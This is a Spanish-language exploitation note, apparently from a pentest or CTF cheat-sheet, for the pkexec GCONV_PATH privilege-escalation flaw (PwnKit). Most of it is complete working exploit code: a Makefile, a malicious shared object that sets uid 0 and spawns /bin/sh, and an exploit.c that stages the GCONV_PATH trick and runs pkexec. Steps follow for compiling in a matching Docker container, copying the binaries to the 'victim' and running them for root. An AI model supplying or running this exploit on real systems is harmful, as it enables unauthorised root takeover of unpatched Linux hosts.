Afecta a versiones vulnerables de pkexec, que tiene el SUID activado.
This tool is using SUID-root to run commands as another user, normally the super user (root). However, the flaw arises from the sloppy processing of command line arguments. An out-of-bounds read and write occurs in main() of pkexec, posing this security risk. 

Therefore, by setting environment variables like **GCONV_PATH** malicious code can be executed as the super user.

1. Ver localización del binario `locate pkexec`
2. Ver versión `<ruta>/pkexec --version`
3. Poner en internet la versión pkexec exploit y ver si tiene asociada el CVE aqui descrito
4. Ver os-release de la máquina víctima `cat /etc/os-release`
	Ejemplo de salida:
NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal


Estos tres archivos son necesarios para explotar la vulnerabilidad.
1.  Makefile
```Makefile
all: 
	gcc -shared -o evil.so -fPIC evil-so.c 
	gcc exploit.c -o exploit 
clean: 
	rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
```

2.  evil-so.c
```c
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
void gconv() {} 
void gconv_init() 
{ 
	setuid(0); 
	setgid(0); 
	setgroups(0); 
	execve("/bin/sh", NULL, NULL); 
}
```

3. exploit.c
```c
##### exploit.c ##### 
#include <stdio.h> 
#include <stdlib.h> 
#define BIN "/usr/bin/pkexec" 
#define DIR "evildir" 
#define EVILSO "evil" 
int main() { 
	char *envp[] = { DIR, "PATH=GCONV_PATH=.", "SHELL=ryaagard", "CHARSET=ryaagard", NULL }; 
	char *argv[] = { NULL }; 
	system("mkdir GCONV_PATH=."); 
	system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR); system("mkdir " DIR); 
	system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules"); 
	system("cp " EVILSO ".so " DIR); 
	execve(BIN, argv, envp); 
	return 0; 
}
```

Hay que compilarlos en una máquina con la misma versión de ldd que la víctima (**EN EL CASO DE QUE LA VICTIMA NO TENGA NI MAKE NI GCC**), por ello usamos un contenedor.
1. Colocamos en una carpeta, por ejemplo `work` los 3 archivos descritos arriba, el Makefile, el evil.so.c y el exploit.c.
2. Creamos un contenedor con la versión de la máquina víctima y un volumen en el directorio actual que es donde están los ficheros arriba descritos.
```bash
docker run --rm -it -v "$PWD":/work ubuntu:20.04 bash
```
3. Una vez dentro del contenedor, instalamos las dependencias para usar make y gcc:
```bash
apt-get update
apt-get install -y build-essential
```

4. Entramos en la carpeta dónde se montó el volumen /work y ahí estarán los ficheros.
5. Compilamos con `make all`
6. Comprobamos que están lo binarios `ll`
7. Los transferimos a la máquina víctima y ejecutamos `./exploit`

ENJOY ROOT!